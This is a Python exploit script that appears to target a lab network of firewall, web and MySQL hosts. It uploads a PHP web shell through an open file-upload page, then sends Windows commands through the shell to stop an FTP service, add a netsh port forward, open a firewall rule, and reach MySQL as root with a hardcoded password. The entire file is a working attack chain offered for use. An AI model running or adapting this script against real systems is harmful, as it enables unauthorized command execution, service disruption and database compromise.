#!/usr/bin/python
import sys, requests, os, time

arg_length = len(sys.argv)

if(arg_length < 4): 
    print("[!] Not enough arguments passed to the script.")
    print("[>] Usage: " + sys.argv[0] + " <FIREWALL IP> <WEB IP> <MYSQL IP>\n")
    sys.exit()

if(arg_length > 4): 
    print("[!] Too many arguments passed to the script.")
    print("[>] Usage: " + sys.argv[0] + " <FIREWALL IP> <WEB IP> <MYSQL IP>\n")
    sys.exit()

robots_url = "http://" + sys.argv[1] + "/robots.txt"
upload_url = "http://" + sys.argv[1] + "/simple_upload/upload_file.php"
backdoor_url = "http://" + sys.argv[1] + "/simple_upload/uploaded_files/sb.php?cmd="

robots_get = requests.get(robots_url)
if(robots_get.status_code != 200):
    print("[!] Error while attempting to get robots.txt")
    sys.exit()
else:
    print("[+] Contents of the robots.txt:")
    print(robots_get.text)

post_request_headers = {
    'Host': sys.argv[0],
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------137588257440422773621356336789',
    'Content-Length': '5862',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

port_request_data = """
-----------------------------137588257440422773621356336789
Content-Disposition: form-data; name="uploadedFile"; filename="sb.php"
Content-Type: application/x-php

<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->

-----------------------------137588257440422773621356336789
Content-Disposition: form-data; name="uploadBtn"

Upload
-----------------------------137588257440422773621356336789--
"""

upload_backdoor_post = requests.post(upload_url, data=port_request_data, headers=post_request_headers)
if(upload_backdoor_post.status_code != 200):
    print("[!] Error while attempting to get robots.txt")
    sys.exit()
else:
    print("[+] Backdoor successfully uploaded.")

ipv4 = os.popen('ip addr show eth0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()

cleanup_forward_url = backdoor_url + "netsh%20interface%20portproxy%20reset"
cleanup_forward_get = requests.get(cleanup_forward_url)
if(cleanup_forward_get.status_code != 200):
    print("[!] Error while performing initial cleanup")
    sys.exit()

cleanup_rule_url = backdoor_url + "netsh%20advfirewall%20firewall%20del%20rule%20name=%22forward_port_rule%22"
cleanup_rule_get = requests.get(cleanup_rule_url)
if(cleanup_rule_get.status_code != 200):
    print("[!] Error while performing initial cleanup")
    sys.exit()

net_stop_url = backdoor_url + "net%20stop%20FileZillaServer"
net_stop_get = requests.get(net_stop_url)
if(net_stop_get.status_code != 200):
    print("[!] Error while stopping the FTP server")
    sys.exit()
else:
    print("[+] FTP Server successfully stopped")

net_forward_url = backdoor_url + "netsh%20interface%20portproxy%20add%20v4tov4%20listenport=21%20listenaddress=" + sys.argv[2] + "%20connectport=3306%20connectaddress=" + sys.argv[3]
net_forward_get = requests.get(net_forward_url)
if(net_forward_get.status_code != 200):
    print("[!] Error while adding the local port forwarding rule")
    sys.exit()
else:
    print("[+] Local port forwarding successful")

net_rule_url = backdoor_url + "netsh%20advfirewall%20firewall%20add%20rule%20name=\"forward_port_rule\"%20protocol=TCP%20dir=in%20localip=" + sys.argv[2] + "%20localport=21%20action=allow"
net_rule_get = requests.get(net_rule_url)
if(net_rule_get.status_code != 200):
    print("[!] Error while adding the firewall rule")
    sys.exit()
else:
    print("[+] Firewall exception successfully added")

print("[+] local port forward successfully set, you can now attempt to connect to the MYSQL server using the following command:")
print("\tmysql --host=" + sys.argv[1] + " --port=21 -uroot -pMkiuCbQ2F6kMkC")
# mysql --host=192.168.50.40 --port=21 -uroot -pMkiuCbQ2F6kMkC  
